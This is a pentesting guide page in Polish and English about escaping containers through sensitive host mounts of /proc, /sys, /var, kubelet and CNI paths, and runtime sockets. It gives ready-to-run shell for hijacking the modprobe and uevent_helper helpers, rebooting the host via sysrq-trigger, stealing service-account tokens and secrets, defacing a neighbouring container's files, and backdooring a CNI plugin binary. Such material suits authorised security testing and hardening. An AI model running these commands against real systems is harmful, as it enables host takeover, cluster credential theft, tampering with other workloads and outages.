# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Host mounts są jednym z najważniejszych praktycznych surface’ów container-escape, ponieważ często redukują starannie odizolowany widok procesu do bezpośredniej widoczności host resources. Niebezpieczne przypadki nie ograniczają się do `/`. Bind mounts `/proc`, `/sys`, `/var`, runtime sockets, state zarządzanego przez kubelet albo paths związane z device mogą ujawniać kernel controls, credentials, filesystemy sąsiednich kontenerów oraz runtime management interfaces.

Ta strona istnieje osobno od indywidualnych stron ochrony, ponieważ model nadużycia jest przekrojowy. Writable host mount jest niebezpieczny częściowo z powodu mount namespaces, częściowo z powodu user namespaces, częściowo z powodu pokrycia przez AppArmor lub SELinux, a częściowo z powodu tego, jaki dokładnie host path został wystawiony. Traktowanie tego jako osobnego tematu znacznie ułatwia rozumowanie o surface ataku.

## `/proc` Exposure

procfs zawiera zarówno zwykłe informacje o procesach, jak i wysokiej ważności kernel control interfaces. Bind mount taki jak `-v /proc:/host/proc` albo widok kontenera, który ujawnia nieoczekiwane writable wpisy proc, może więc prowadzić do information disclosure, denial of service albo bezpośredniego host code execution.

Najbardziej wartościowe paths procfs obejmują:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Zacznij od sprawdzenia, które wysokowartościowe wpisy procfs są widoczne lub writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Te ścieżki są interesujące z różnych powodów. `core_pattern`, `modprobe` i `binfmt_misc` mogą stać się host code-execution paths, gdy są zapisywalne. `kallsyms`, `kmsg`, `kcore` i `config.gz` to potężne źródła reconnaissance do kernel exploitation. `sched_debug` i `mountinfo` ujawniają kontekst process, cgroup i filesystem, co może pomóc odtworzyć układ hosta z wnętrza kontenera.

Praktyczna wartość każdej ścieżki jest różna, a traktowanie ich wszystkich tak, jakby miały ten sam wpływ, utrudnia triage:

- `/proc/sys/kernel/core_pattern`
Jeśli jest zapisywalna, jest to jedna z najwyżej wpływowych ścieżek procfs, ponieważ kernel wykona pipe handler po craszu. Kontener, który może wskazać `core_pattern` na payload zapisany w swoim overlay albo w zamontowanej host path, często może uzyskać host code execution. Zobacz też [read-only-paths.md](protections/read-only-paths.md) dla dedykowanego przykładu.
- `/proc/sys/kernel/modprobe`
Ta ścieżka kontroluje helper userspace używany przez kernel, gdy musi wywołać logikę ładowania modułów. Jeśli jest zapisywalna z kontenera i interpretowana w kontekście hosta, może stać się kolejnym primitive do host code-execution. Jest szczególnie interesująca w połączeniu ze sposobem wyzwolenia helper path.
- `/proc/sys/vm/panic_on_oom`
Zwykle nie jest to czysty primitive escape, ale może przekształcić presję pamięci w denial of service dla całego hosta, zamieniając warunki OOM w zachowanie kernel panic.
- `/proc/sys/fs/binfmt_misc`
Jeśli interfejs rejestracji jest zapisywalny, atakujący może zarejestrować handler dla wybranej magic value i uzyskać execution w kontekście hosta, gdy zostanie uruchomiony pasujący plik.
- `/proc/config.gz`
Przydatne do kernel exploit triage. Pomaga ustalić, które subsystems, mitigations i opcjonalne kernel features są włączone, bez potrzeby metadanych pakietów hosta.
- `/proc/sysrq-trigger`
Głównie ścieżka do denial-of-service, ale bardzo poważna. Może natychmiast zrestartować, wywołać panic lub w inny sposób zakłócić hosta.
- `/proc/kmsg`
Ujawnia komunikaty kernel ring buffer. Przydatne do fingerprinting hosta, analizy crashy i w niektórych środowiskach do leak informacji pomocnych przy kernel exploitation.
- `/proc/kallsyms`
Cenne, gdy jest czytelne, ponieważ ujawnia eksportowane informacje o kernel symbolach i może pomóc przełamać założenia dotyczące address randomization podczas tworzenia kernel exploit.
- `/proc/[pid]/mem`
To bezpośredni interfejs do pamięci process. Jeśli docelowy process jest osiągalny z wymaganymi warunkami w stylu ptrace, może pozwolić na odczyt lub modyfikację pamięci innego process. Realny wpływ zależy mocno od credentials, `hidepid`, Yama i ograniczeń ptrace, więc jest to potężna, ale warunkowa ścieżka.
- `/proc/kcore`
Ujawnia widok pamięci systemu w stylu core-image. Plik jest ogromny i niewygodny w użyciu, ale jeśli jest sensownie czytelny, wskazuje na źle wystawioną powierzchnię pamięci hosta.
- `/proc/kmem` and `/proc/mem`
Historycznie wysoko wpływowe raw memory interfaces. Na wielu nowoczesnych systemach są wyłączone lub mocno ograniczone, ale jeśli są obecne i użyteczne, należy traktować je jako krytyczne findings.
- `/proc/sched_debug`
Wycieka informacje o scheduling i task, które mogą ujawnić identities process hosta, nawet gdy inne widoki process wyglądają czyściej niż oczekiwano.
- `/proc/[pid]/mountinfo`
Niezwykle przydatne do odtworzenia, gdzie kontener naprawdę znajduje się na hoście, które paths są oparte o overlay i czy writable mount odpowiada host content, czy tylko warstwie kontenera.

Jeśli `/proc/[pid]/mountinfo` lub szczegóły overlay są czytelne, użyj ich do odzyskania host path filesystemu kontenera:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Te polecenia są przydatne, ponieważ wiele trików host-execution wymaga zamiany ścieżki wewnątrz kontenera na odpowiadającą jej ścieżkę z perspektywy hosta.

### Pełny przykład: nadużycie ścieżki pomocniczej `modprobe`

Jeśli `/proc/sys/kernel/modprobe` jest zapisywalny z poziomu kontenera, a ścieżka helpera jest interpretowana w kontekście hosta, można ją przekierować na payload kontrolowany przez atakującego:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Dokładny trigger zależy od celu i zachowania kernela, ale ważny punkt jest taki, że zapisywalna ścieżka helpera może przekierować przyszłe wywołanie kernel helper do treści host-path kontrolowanej przez atakującego.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Jeśli celem jest ocena exploitability, a nie natychmiastowy escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Te polecenia pomagają odpowiedzieć, czy widoczne są użyteczne informacje o symbolach, czy ostatnie komunikaty jądra ujawniają interesujący stan oraz które funkcje jądra lub mitigations są skompilowane. Wpływ zwykle nie polega na bezpośrednim escape, ale może znacznie skrócić triage podatności jądra.

### Full Example: SysRq Host Reboot

Jeśli `/proc/sysrq-trigger` jest zapisywalny i trafia do widoku hosta:
```bash
echo b > /proc/sysrq-trigger
```
Efekt to natychmiastowy reboot hosta. To nie jest subtelny przykład, ale jasno pokazuje, że exposure procfs może być znacznie poważniejsze niż information disclosure.

## `/sys` Exposure

sysfs exposes duże ilości stanu kernel i device. Niektóre ścieżki sysfs są głównie przydatne do fingerprinting, podczas gdy inne mogą wpływać na helper execution, device behavior, security-module configuration lub firmware state.

Wysokowartościowe ścieżki sysfs obejmują:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Te ścieżki mają znaczenie z różnych powodów. `/sys/class/thermal` może wpływać na thermal-management behavior, a więc na stabilność hosta w źle zabezpieczonych środowiskach. `/sys/kernel/vmcoreinfo` może leakować crash-dump i informacje o kernel-layout, które pomagają w niskopoziomowym fingerprinting hosta. `/sys/kernel/security` to interfejs `securityfs` używany przez Linux Security Modules, więc nieoczekiwany dostęp może ujawniać lub zmieniać state związany z MAC. Ścieżki EFI variables mogą wpływać na firmware-backed boot settings, co czyni je znacznie poważniejszymi niż zwykłe pliki konfiguracyjne. `debugfs` w `/sys/kernel/debug` jest szczególnie niebezpieczny, ponieważ jest celowo interfejsem dla developerów i ma znacznie mniej założeń dotyczących bezpieczeństwa niż hardened production-facing kernel APIs.

Przydatne polecenia do sprawdzenia tych ścieżek to:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Co sprawia, że te komendy są interesujące:

- `/sys/kernel/security` może ujawnić, czy AppArmor, SELinux lub inna powierzchnia LSM jest widoczna w sposób, który powinien pozostać tylko hostowy.
- `/sys/kernel/debug` to często najbardziej alarmujące znalezisko w tej grupie. Jeśli `debugfs` jest zamontowany i można go odczytać lub zapisać, spodziewaj się szerokiej powierzchni po stronie jądra, której dokładne ryzyko zależy od włączonych węzłów debug.
- Ujawnienie zmiennych EFI jest mniej częste, ale jeśli występuje, ma duży wpływ, ponieważ dotyczy ustawień opartych na firmware, a nie zwykłych plików runtime.
- `/sys/class/thermal` ma znaczenie głównie dla stabilności hosta i interakcji ze sprzętem, a nie dla eleganckiego shell-style escape.
- `/sys/kernel/vmcoreinfo` to głównie źródło host-fingerprinting i analizy crash, przydatne do zrozumienia niskopoziomowego stanu jądra.

### Full Example: `uevent_helper`

Jeśli `/sys/kernel/uevent_helper` można zapisać, kernel może uruchomić helper kontrolowany przez atakującego, gdy zostanie wyzwolony `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Powodem, dla którego to działa, jest to, że ścieżka helper jest interpretowana z perspektywy hosta. Po uruchomieniu helper działa w kontekście hosta, a nie wewnątrz bieżącego kontenera.

## `/var` Exposure

Montowanie hosta `/var` do kontenera jest często niedoceniane, ponieważ nie wygląda tak spektakularnie jak montowanie `/`. W praktyce może to wystarczyć, aby dostać się do runtime sockets, katalogów snapshotów kontenerów, woluminów poda zarządzanych przez kubelet, projektowanych tokenów service-account oraz sąsiednich filesystemów aplikacji. Na nowoczesnych node'ach `/var` często jest miejscem, w którym faktycznie znajduje się najbardziej interesujący operacyjnie stan kontenerów.

### Kubernetes Example

Pod z `hostPath: /var` często może odczytać tokeny projektowane innych podów oraz zawartość overlay snapshot:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Te polecenia są przydatne, ponieważ odpowiadają na pytanie, czy mount ujawnia tylko mało istotne dane aplikacji, czy też wysokiej wartości credentials klastra. Odczytywalny service-account token może od razu zamienić local code execution w Kubernetes API access.

Jeśli token jest obecny, sprawdź, do czego ma dostęp, zamiast kończyć na samym jego wykryciu:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Wpływ tutaj może być znacznie większy niż lokalny dostęp do node. Token z szerokim RBAC może zamienić zamontowany `/var` w compromise całego klastra.

### Docker And containerd Example

Na hostach Docker istotne dane często znajdują się w `/var/lib/docker`, natomiast na node'ach Kubernetes opartych o containerd mogą być pod `/var/lib/containerd` albo w ścieżkach specyficznych dla snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Jeśli zamontowany `/var` ujawnia zapisywalne zawartości snapshotu innego workload, atakujący może zmodyfikować pliki aplikacji, podłożyć web content albo zmienić startup scripts bez dotykania bieżącej konfiguracji kontenera.

Konkretnie możliwe nadużycia po znalezieniu zapisywalnej zawartości snapshotu:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Te polecenia są przydatne, ponieważ pokazują trzy główne rodziny wpływu montowanego `/var`: modyfikację aplikacji, odzyskiwanie sekretów oraz lateral movement do sąsiednich workloadów.

## Kubelet State, Plugins, And CNI Paths

Mount `/var/lib/kubelet`, `/opt/cni/bin` lub `/etc/cni/net.d` jest często wystawiany przez privileged DaemonSets, CNI agents, CSI node plugins, GPU operators i storage helpers. Te mounty łatwo zbyć jako „node plumbing”, ale znajdują się bezpośrednio na ścieżce execution dla nowych podów i często zawierają kubelet credentials, projected secrets, registration sockets oraz executable host-side plugin binaries.

Wysokowartościowe cele obejmują:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Przydatne polecenia do review to:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Why these paths matter:

- `/var/lib/kubelet/pki` may expose kubelet client certificates and other node-local credentials that can sometimes be reused against the API server or kubelet-facing TLS endpoints, depending on cluster design.
- `/var/lib/kubelet/pods` often contains projected service-account tokens and mounted Secrets for neighboring pods on the same node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` is mainly a reconnaissance surface, but a very useful one: it reveals which pods and containers currently own GPUs, hugepages, SR-IOV devices, and other scarce node-local resources.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins`, and `/var/lib/kubelet/plugins_registry` reveal which CSI, DRA, and device plugins are installed and which sockets the kubelet is expected to talk to. If those directories are writable rather than merely readable, the finding becomes much more serious.
- `/opt/cni/bin` and `/etc/cni/net.d` sit directly on the pod-network setup path. Writable access there is often a delayed host-execution primitive rather than just configuration exposure.

### Full Example: Writable `/opt/cni/bin`

If a host CNI binary directory is mounted read-write, replacing a plugin can be enough to obtain host execution the next time the kubelet creates a pod sandbox on that node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
To nie jest tak natychmiastowe jak zamontowany `docker.sock`, ale często jest bardziej realistyczne w przejętych podach infrastruktury Kubernetes. Najważniejsza rzecz jest taka, że zmodyfikowany binarny plik jest później uruchamiany przez host network setup flow, a nie przez bieżący container.


## Runtime Sockets

Sensitive host mounts często obejmują runtime sockets zamiast pełnych katalogów. Są na tyle ważne, że zasługują tutaj na wyraźne powtórzenie:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Zobacz [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md), aby poznać pełne flow exploitation, gdy jedno z tych sockets zostanie zamontowane.

Jako szybki pierwszy pattern interakcji:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Jeśli jedno z nich się powiedzie, ścieżka od "mounted socket" do "start a more privileged sibling container" jest zwykle znacznie krótsza niż jakakolwiek ścieżka kernel breakout.

## Mount-Related CVEs

Host mounts również przecinają się z podatnościami runtime. Ważne, niedawne przykłady obejmują:

- `CVE-2024-21626` w `runc`, gdzie wycieknięty deskryptor pliku katalogu mógł umieścić bieżący katalog na host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652` i `CVE-2024-23653` w BuildKit, gdzie złośliwe Dockerfiles, frontends i przepływy `RUN --mount` mogły ponownie wprowadzić host file access, deletion lub elevated privileges during builds.
- `CVE-2024-1753` w Buildah i Podman build flows, gdzie spreparowane bind mounts podczas build mogły ujawnić `/` read-write.
- `CVE-2025-47290` w `containerd` 2.1.0, gdzie TOCTOU podczas image unpack mogło pozwolić specjalnie spreparowanemu image modyfikować host filesystem during pull.

Te CVEs są tu ważne, ponieważ pokazują, że obsługa mountów to nie tylko konfiguracja operatora. Sam runtime może również wprowadzać warunki escape oparte na mountach.

## Checks

Użyj tych poleceń, aby szybko zlokalizować mount exposures o najwyższej wartości:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
What is interesting here:

- Host root, `/proc`, `/sys`, `/var`, and runtime sockets are all high-priority findings.
- Writable proc/sys entries often mean the mount is exposing host-global kernel controls rather than a safe container view.
- Mounted `/var` paths deserve credential and neighboring-workload review, not just filesystem review.
- Kubelet state directories and CNI/plugin paths deserve the same priority as runtime sockets because they often sit directly on the node's pod-creation and credential-distribution path.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
